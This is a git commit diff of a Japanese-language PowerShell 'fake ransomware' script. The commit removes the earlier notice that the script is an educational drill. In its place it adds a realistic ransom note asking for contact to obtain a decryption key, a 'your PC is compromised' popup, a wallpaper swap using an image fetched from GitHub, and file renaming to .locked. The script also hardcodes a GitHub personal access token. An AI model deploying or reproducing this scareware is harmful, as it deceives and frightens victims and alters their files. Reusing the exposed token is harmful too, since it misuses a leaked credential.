fdd3468fd2e80034a2e113105a95524a145f0608
cyberattackerdemo <cyber.attacker.demo@gmail.com>
2025-04-01 18:44:20 +0900

    Add files via upload

--- FakeRansom_JP.ps1
+++ FakeRansom_JP.ps1
@@ -1,25 +1,42 @@
+# PowerShellスクリプト：FakeRansom_JP_GitHubWall.ps1
 
+# 設定
+$token = "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" # PATを貼る
+$url = "https://raw.githubusercontent.com/cyberattackerdemo/main/main/yourpcishacked.jpg"
+$imgPath = "$env:PUBLIC\yourpcishacked.jpg"
 $desktop = [Environment]::GetFolderPath("Desktop")
 
-# デスクトップ上の .txt ファイルに .locked をつけて名前変更
-Get-ChildItem -Path $desktop -Filter *.txt | ForEach-Object {
+# ▼ 警告ファイル
+$warning = @"
+あなたのファイルは暗号化されました。
+復号キーを取得するには、以下に連絡してください：
+cyber.attacker.demo@gmail.com
+"@
+
+# GitHubから画像ダウンロード
+$headers = @{ Authorization = "token $token" }
+$response = Invoke-WebRequest -Uri $url -Headers $headers -OutFile $imgPath
+
+# 壁紙設定
+$code = @"
+using System.Runtime.InteropServices;
+
+public class Wallpaper {
+  [DllImport("user32.dll", SetLastError = true)]
+  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+Add-Type $code
+[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)
+
+# デスクトップ上の .txt ファイルを改名
+Get-ChildItem $desktop -Filter *.txt | ForEach-Object {
     Rename-Item $_.FullName ($_.Name + ".locked")
 }
 
-# 警告メッセージ作成（日本語）
-$warning = @"
-!!! ファイルは暗号化されました !!!
+# 警告テキスト出力
+Set-Content -Path "$desktop\README_復元したくない人は読まないでください.txt" -Value $warning
 
-これは教育目的での模擬ランサムウェア実行です。
-実際には暗号化されていませんが、ファイル名が変更されました。
-
-速やかにインシデント対応チームへ連絡してください。
-
---- ハンズオン演習用デモ ---
-"@
-
-Set-Content -Path "$desktop\README_復号方法について.txt" -Value $warning
-
-# 警告ポップアップを表示（日本語）
+# メッセージ表示
 Add-Type -AssemblyName PresentationFramework
-[System.Windows.MessageBox]::Show("ファイルは暗号化されました。\n復号方法についてのファイルをデスクトップ上で確認してください。", "ランサムウェア警告", 0, 'Warning')
+[System.Windows.MessageBox]::Show("あなたのPCは侵害されました！\n復号キーが必要です。", "警告", 0, 'Warning')
